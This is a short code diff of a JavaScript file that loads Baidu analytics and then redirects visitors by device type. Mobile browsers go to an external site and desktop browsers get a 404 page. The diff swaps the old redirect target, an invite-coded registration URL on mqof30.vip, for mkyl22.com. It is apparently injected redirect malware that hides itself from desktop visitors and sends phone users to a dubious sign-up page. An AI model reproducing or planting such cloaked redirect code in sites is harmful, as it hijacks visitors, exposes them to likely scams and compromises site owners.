@@ -6,7 +6,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["https://www.mqof30.vip:8443/entry/register68801/?i_code=39290091", "https://www.mqof30.vip:8443/entry/register68801/?i_code=39290091"];
+	var arr = ["https://mkyl22.com", "https://mkyl22.com"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
